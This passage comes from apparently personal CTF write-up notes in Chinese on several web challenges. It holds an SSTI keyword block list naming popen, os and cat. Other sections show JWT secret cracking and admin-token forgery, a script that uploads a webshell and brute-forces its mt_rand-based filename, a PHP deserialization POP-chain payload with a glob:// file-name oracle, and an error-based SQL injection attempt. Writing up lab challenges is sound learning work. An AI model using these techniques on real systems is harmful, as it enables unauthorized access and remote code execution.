		  
		         '''
		      bl = ['_', '\\', '\'', '"', 'request', "+", 'class', 'init', 'arg', 'config', 'app', 'self', 'cd', 'chr',
		            'request', 'url', 'builtins', 'globals', 'base', 'pop', 'import', 'popen', 'getitem', 'subclasses', '/',
		            'flashed', 'os', 'open', 'read', 'count', '*', '43', '45', '38', '124', '47', '59', '99', '100', 'cat', '~',
		            ':', 'not', '0', 'length', 'index', '-', 'ord', '37', '94', '96', '48', '49', '50', '51', '52', '53', '54',
		            '55', '56', '57',
		            '58', '59', '[', ']', '@', '^', '#']
		      for i in bl:
		          if i in name:
		              return render_template('klf.html')
		              #return "真是klf！！！回去多学学啦"
		  
		      pattern = r"\s*\)\s*\)"
		      match = re.search(pattern, name)
		      pattern2 = r"\s*\)\s*(,)?\s*\)"
		      match2 = re.search(pattern2, name)
		      pattern3 = r"\s*\)\s*\)\s*\|"
		      match3 = re.search(pattern3, name)
		      pattern4 = r"\s*,\s*\)\s*\)\s*\|"
		      match4 = re.search(pattern4, name)
		  
		      pattern_mo = r"\d+\s*%\s*\d+|[a-zA-Z]+\s*%\s*[a-zA-Z]+"
		      matche_mo = re.search(pattern_mo, name)
		  
		      if match:
		          if match2.group(1):
		              return render_template('klf.html')
		          elif match4:
		              return render_template('klf.html')
		          elif match3:
		              return render_template_string(template % name)
		          else:
		              return render_template('klf.html')
		  
		      # 输出匹配的结果
		      if matche_mo :
		          return render_template('klf.html')
		  
		  
		      a=render_template_string(template % name)
		      if "{" in a:
		          return a + render_template('win.html')
		      return  a
		  @app.route('/robots.txt', methods=['GET'])
		  def robots():
		      return send_from_directory(os.path.join(app.root_path, 'static'),
		                                 'robots.txt', mimetype='text/plain')
		  
		  
		  
		  
		  if __name__ == '__main__':
		      app.run(host='0.0.0.0', port=7888, debug=False)
		  ```
	- 直接拿flag就行
		- ![Screenshot_2023-11-22_09-46-31.png](../assets/Screenshot_2023-11-22_09-46-31_1700617654952_0.png)
		-
- # change_it
  collapsed:: true
	- 思路
		- 爆破得到注释和一系列信息泄漏，拿到用户名和密码登陆
		- 爆破jwt密钥伪造admin身份
		- 根据爆破看到的`check.php`对`change.php`上传文件并爆破文件名
	- Yuntong爆，看到注释和一系列文件泄漏
		- ```yaml
		  "CheckCommentsMod":
		  - |-
		    在页面 https://pn27yd6kvw2wf4fopctt49561.node.game.sycsec.com/ 找到以下注释：['<!--\r\n 用户名为：user\r\n 密码也为：user\r\n -->']
		  - |-
		    在页面 https://pn27yd6kvw2wf4fopctt49561.node.game.sycsec.com 找到以下注释：['<!--\r\n 用户名为：user\r\n 密码也为：user\r\n -->']
		  "FindPostParamsMod":
		  - |-
		    在页面 https://pn27yd6kvw2wf4fopctt49561.node.game.sycsec.com/login.php 找到以下参数：['username']
		  "SiteBurstMod":
		  - |-
		    爆破站点目录 https://pn27yd6kvw2wf4fopctt49561.node.game.sycsec.com/ 完毕，其中存在以下文件泄露：['login.php', 'composer.json', 'start.sh', 'check.php', 'composer.lock', 'vendor/composer/LICENSE', 'vendor/composer/installed.json']
		  ```
	- start.sh信息泄漏，没什么用
		- ```
		  cat start.sh 
		  #!/bin/sh
		  sed -i "s/flag{test}/$geek_flag/" /flag
		  export geek_flag=""
		  service apache2 start
		  tail -f /dev/null
		  rm -f /var/www/html/start.sh
		  
		  ```
	- check.php看到提示
		- 这里的check.php包含了`change.php`的逻辑和chatgpt的回答，可以知道change.php会将上传的文件保存在一个随机文件名的文件中，随机文件名由当前时间戳作为种子生成。
		- ```html
		  
		  Warning: Undefined array key "avatar" in /var/www/html/check.php on line 13
		  
		  Warning: Trying to access array offset on value of type null in /var/www/html/check.php on line 13
		  
		  Warning: Undefined array key "avatar" in /var/www/html/check.php on line 20
		  
		  Warning: Trying to access array offset on value of type null in /var/www/html/check.php on line 20
		  {"status":"success"} /* 是的，如果你知道服务器端使用的种子（seed），你可以通过相同的种子来生成相同的随机文件名。在你提供的代码中，种子是通过当前时间生成的，因此如果你知道服务器端生成文件名的时间，你可以使用相同的时间戳作为种子来生成相同的文件名。 以下是一个示例脚本，假设你知道服务器端生成文件名的时间戳为 $serverSeed： php Copy
		  Warning: Undefined array key "avatar" in /var/www/html/check.php on line 56
		  
		  Warning: Trying to access array offset on value of type null in /var/www/html/check.php on line 56
		  Uploaded file name: HztUUVQ3X4.请注意，上述示例中的 $serverSeed 是一个假设的值，你需要替换为服务器端实际使用的种子。另外，该示例仅适用于你确切知道服务器端生成文件名的种子，并且能够将该种子值传递给你的脚本。如果你无法获取种子值或不确定种子值的情况下，无法准确生成相同的文件名。 */ 
		  ```
	- 登陆，用`c-jwt-cracker`爆jwt，然后用[jwt.io](https://jwt.io)伪造jwt
		- ```
		  ./jwtcrack 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJRaW5nd2FuIiwibmFtZSI6InVzZXIiLCJhZG1pbiI6ImZhbHNlIn0.gzCFCz2Hw5c_EIjcM2lQ2QL3aDW3rAAHU2ZQ50_tnY4'
		  Secret is "yibao"
		  ```
	- change.html看到注释
		- ```html
		   <!-- 一直连不上？连不上就对啦！ -->
		    <!-- 
		      php版本为8.0
		    function php_mt_seed($seed)
		          {
		              mt_srand($seed);
		          }
		          $seed = time();
		          php_mt_seed($seed);
		          $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
		  
		          $newFileName = '';
		          for ($i = 0; $i < 10; $i++) {
		              $newFileName .= $characters[mt_rand(0, strlen($characters) - 1)];
		          }
		    
		    -->
		  ```
	- 写脚本生成一系列可能的文件名用于爆破
		- ```php
		  <?php
		  function php_mt_seed($seed)
		  {
		      mt_srand($seed);
		  }
		  function filenameByTimeStamp($seed)
		  {
		      php_mt_seed($seed);
		      $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
		  
		      $newFileName = '';
		      for ($i = 0; $i < 10; $i++) {
		          $newFileName .= $characters[mt_rand(0, strlen($characters) - 1)];
		      }
		      return $newFileName . ".php";
		  }
		  $filenames = [];
		  $time = time();
		  for($i = $time + 60; $i >=$time-60; $i --) {
		      array_push($filenames, filenameByTimeStamp($i));
		  }
		  echo json_encode($filenames);
		  ```
	- 然后写脚本爆破，缺失的函数补一下就能用了
		- ```python
		  url = "https://vs91x7gz7mswurabxtzqw5fvt.node.game.sycsec.com"
		  cookie = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJRaW5nd2FuIiwibmFtZSI6ImFkbWluIiwiYWRtaW4iOiJ0cnVlIn0.qs6tjnaghMXiTsvqEMUauz_JGzxxKdtaXPGVtQUEHek"
		  
		  def test_file(filename):
		      r = base_get(url + f"/upload/{filename}")
		      return len(r.text) if r.status_code not in (404, ) else -r.status_code
		  
		  # 传webshell
		  with open("a.php", "rb") as f:
		  
		      r = base_post(url + "/change.php", files = {
		          "avatar": f
		      }, data = {
		          "username": "admin",
		          "skills": "123",
		          "motto": "234"
		      }, cookies = {
		          "token": cookie
		      })
		  
		  out = shell.exec("php genkey.php")[0]
		  print(out)
		  possible_filenames = json.loads(out)
		  
		  # 逐个测试possible_filenames中的文件名
		  d = burst.auto_burst_resp_len_multi(
		      test_file,
		      possible_filenames
		  )
		  del d[-404]
		  print(d)
		  ```
		- ```text
		  ["qOludG61S5.php","Od9PEN9abH.php","hjJEb3aXIj.php","4LJUMbt7KE.php","jxb7y6nkiU.php","3FiSjKRS8B.php","8MseNPE7RN.php","ONmZlfJN8O.php","ff7PICfWR1.php","Vdb0yTSZUQ.php","RbeFCrmPVW.php","nqRsrMzI0I.php","vKv9hAXZj2.php","kSLA9bCrrI.php","mp24hLAR7v.php","sVHiFFRN9h.php","PVzpLHu7XW.php","pihqFZmO58.php","EGrXrD4WPs.php","awuRo77tQr.php","KDklZjBUwW.php","cZXLprxox5.php","PnVICRqhr8.php","dWt8vMy3lT.php","JbcLChD9um.php","3fA2AWKdkq.php","nJqsEuYE8w.php","2wKtqrQM8o.php","43gQs1YDow.php","HftkaUbEZm.php","R0EiVqDNCK.php","1RD6wS6VoU.php","12YaHcsQjl.php","5GvxeMbceM.php","Ej8yFHbObE.php","RyTUIeffR5.php","ZympEVXHAb.php","4COrkIpqDW.php","qTzUISSKQg.php","n1IATr9OoZ.php","Okm6nDOzUF.php","9W70gxVILZ.php","qLR7JmiWwQ.php","esifphkfyE.php","RMpscbzPii.php","mdZByqotCM.php","Pr5zvdp4Di.php","TEDpNpiu8c.php","8adHdi8cBI.php","sBOQ8ojC1N.php","EeFJtYPm7o.php","q6bjiOuC5V.php","1n6RV1Q2zu.php","4NK9dQ2pOz.php","rPujR4Iw8g.php","eD4DtPYWLD.php","Gf2H4cJQPb.php","yPCSVWiVzN.php","ZvOOcRR0vK.php","VfcMbRnLdA.php","Ka6YkAR182.php","BWEkPtCh5R.php","cIMXJPwj2V.php","pMVfTVZY9s.php","fAeODTpYXF.php","XcTiFHQyV0.php","sRuFOQ6MeN.php","ZS9pnVN82n.php","pUWlnEskj6.php","uqFEbmrGZf.php","kamG2S4GkE.php","eRuziBFsBU.php","ALKkZvmAxi.php","SSDK2bgbVJ.php","fyLISrbu7E.php","bfUnaCBXal.php","ayMW2xVsBL.php","94TlyElurv.php","jvXs1cIFtB.php","0bToD8xtQ8.php","yKeqLBCTbY.php","8bLhU84Q6s.php","HrM1IfF8JP.php","nzCVzGQPCL.php","frP0tk9Yvc.php","fSB8Vpy2WN.php","LwT875IMtj.php","lM7gjlS1NV.php","5o8esZiB8u.php","S40VgPY3Du.php","hjc9s8hkwz.php","6oCByW1Jkx.php","32hP6j66S5.php","Ox8VziZ8xs.php","g3A1rKQelT.php","AJfSaOMBO9.php","oclz3lD4qL.php","cPwVfYvBZ0.php","CcuTWphVfP.php","zqvOPtuaF7.php","Yr5nDYFC35.php","zztQQkd47x.php","dqijVRkHqg.php","6GfYamYbjj.php","WjaJplNQx8.php","kUftwcW4Ks.php","C0XpOJbcT1.php","cF49IbCOwt.php","URyte0fOpD.php","iR8mBwqu40.php","MhZfh9MtuL.php","wZNyiKzCQm.php","nVdT27EKOO.php","vYdF9gJajR.php","pyqeUfB0sJ.php","NDusC7RtUn.php","Ofh5JLPjxI.php","buFfk62fdE.php","SBa2ydlzeq.php","a9wPpJDg8m.php","rM3U3JyG2J.php"]
		  100%|██████████| 121/121 [00:05<00:00, 21.04it/s]
		  {123: ['ZvOOcRR0vK.php']}
		  ```
	- 最后访问上传的webshell`ZvOOcRR0vK.php`即可
- # Akane!
  collapsed:: true
	- pop
	  collapsed:: true
		- ```php
		  $idol = new Idol();
		  $idol -> Akane = $_GET["path"];
		  $hoshino = new Hoshino();
		  $hoshino -> Ruby = $idol;
		  $s = serialize($hoshino);
		  $s = str_replace('O:7:"Hoshino":2', 'O:7:"Hoshino":3', $s);
		  echo "st"."art" . base64_encode($s) . "st"."op";
		  ```
	- 用`glob://`伪协议可以判断是否存在文件
	- fuzz发现有文件长度为`[9, 31]`的文件，后缀为php
	- 爆文件名得到`TheS4crEtF1AgFi1EByo2takuXX`（后缀为php），访问即可
	  collapsed:: true
		- ```python
		  def get_pop_payload(path):
		      api_url = "http://127.0.0.1:8081/pop.php"
		      r = base_get(api_url, params = {
		          "path": path
		      })
		      return r.text.partition("start")[2].partition("stop")[0]
		  
		  def test_path(path):
		      payload = get_pop_payload(path)
		      r = base_get(url, params = {
		          "tuizi": payload
		      })
		      return "Kurokawa Akane" in r.text.partition("</code>")[2]
		  
		  def test_count(c):
		      return test_path("glob:///var/www/html/" + "?" * c + ".php")
		  
		  known = ""
		  target_length = 27
		  while len(known) < target_length:
		      for i in range(32, 128):
		          if chr(i) in ["*", "?", "[", "]"]:
		              continue
		          guess = known + chr(i)
		          glob = "glob:///var/www/html/" + guess + "?" * (target_length - len(guess)) + ".php"
		          if test_path(glob):
		              known += chr(i)
		              print(known)
		              break
		      else:
		          break
		  
		  ```
- # flag 保卫战(施工中)
  collapsed:: true
	- > 施工中，未解出
	- 信息泄漏
		- ```js
		  
		      // 访客密码  password 123456
		      // /flag?pass=123456
		      $(document).ready(function() {
		          $('#loginForm').on('submit', function(e) {
		              e.preventDefault();
		              const username = $('#username').val();
		              const password = $('#password').val();
		              $.ajax({
		                  url: '/login',  // your login API endpoint
		                  type: 'POST',
		                  contentType: 'application/json',
		                  data: JSON.stringify({
		                      'username': username,
		                      'password': password
		                  }),
		                  success: function(data, textStatus, xhr) {
		                      if (xhr.status === 200) {
		                          // handle successful login here
		                          window.location.href = "/upload";
		                      }
		                  },
		                  error: function(xhr, textStatus, error) {
		                      if (xhr.status === 401) {
		                          document.getElementById("error-message").textContent = "用户名或密码错误";
		                      }
		                  }
		              });
		          });
		      });
		  
		  ```
- # scan_tool(施工中)
  collapsed:: true
	- > 施工中，未解出
	- fuzz
		- ```python
		  ['&', '$', '*', '=', '?', '@', '|']
		  ```
	- 发现这些也被禁了
		- `oN`
		- `-oX `
- # ez_sql(施工中)
  collapsed:: true
	- `id[]=1`提示报错array to string conversion
	- 题目貌似会将输入强转为int
	- fuzz: `"1{}1"`这些会被识别成数字，有特殊结果
		- ```python
		  ['.', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'E', '\\', 'e']
		  ```
	- 报错注入？
		- ```python
		  
		  r = base_post(url, data = {
		      "id": "1'+ST_X('err')+'"
		  })
		  print(html.unescape(r.text).partition('<img src="./banner.jpg">')[2])
		  ```
- # 当前进度
	- ![Screenshot_2023-11-22_10-48-30.png](../assets/Screenshot_2023-11-22_10-48-30_1700621333124_0.png)
		-
		-